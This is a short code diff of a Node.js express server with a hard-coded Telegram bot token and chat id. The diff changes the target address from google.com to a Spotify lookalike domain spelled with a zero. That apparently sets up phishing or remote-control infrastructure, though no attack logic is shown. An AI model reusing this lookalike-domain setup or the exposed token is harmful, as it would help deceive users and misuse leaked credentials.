@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '8941445511:AAE9rUS6H1Ou3wEANK3xcVNz5I3AcrWwpiA'
 const id = '6075690916'
-const address = 'https://www.google.com'
+const address = 'https://sp0tify-1.onrender.com/'
 
 const app = express();
 const appServer = http.createServer(app);
